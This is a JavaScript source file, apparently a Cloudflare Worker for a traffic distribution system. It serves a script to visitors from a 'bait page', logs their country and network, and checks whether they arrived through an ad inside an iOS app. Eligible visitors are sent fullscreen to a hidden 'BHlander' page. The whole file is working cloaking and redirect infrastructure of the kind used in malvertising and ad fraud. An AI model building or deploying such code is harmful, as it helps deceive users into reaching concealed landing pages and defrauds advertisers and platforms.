// §6 — the real decision logic. `session`, `detectedAdConnection`, and
// `isIOS` are NOT computed here (or anywhere in the web-delivered pipeline —
// see docs/build-spec.md §6's correction): they're read as pre-existing
// globals that a native host app's WKUserScript injects before this page
// loads. Guarded with `typeof` checks below so this doesn't throw when
// tested outside that native context (e.g. plain browser, or before you've
// built the native host at all).

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript(env) {
  const handlerName = env.NATIVE_BRIDGE_HANDLER || 'SPKViewController'; // TODO: your own handler name

  return `
function classify() {
  const bridge = window.webkit && window.webkit.messageHandlers
    ? window.webkit.messageHandlers[${JSON.stringify(handlerName)}]
    : undefined;
  if (!bridge) {
    console.log('[tds] Unsupported platform');
    return false;
  }

  const hasSession = typeof session !== 'undefined' && session;
  const adConnectionOk = typeof detectedAdConnection !== 'undefined' && detectedAdConnection;
  if (!hasSession || !adConnectionOk) {
    console.log('[tds] No eligible target');
    return false;
  }

  return {
    bridge,
    context: {
      containerType: 'managed',
      source: 'in_app_browser',
      sessionId: session.id,
      attribution: session.attribution,
      navigation: { href: location.href, referrer, targetURL: BHlander },
    },
    webview: { url: BHlander },
    presentation: { animated: true, style: 'fullscreen' },
  };
}
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const body = await request.json().catch(() => ({}));
    env.TDS_ANALYTICS?.writeDataPoint({
      indexes: [body._sessionRef || ''],
      blobs: ['lane-3-arrived', request.cf?.country || '', request.cf?.asn?.toString() || ''],
      doubles: [Date.now()],
    });

    const code = buildDeliveredScript(env);
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
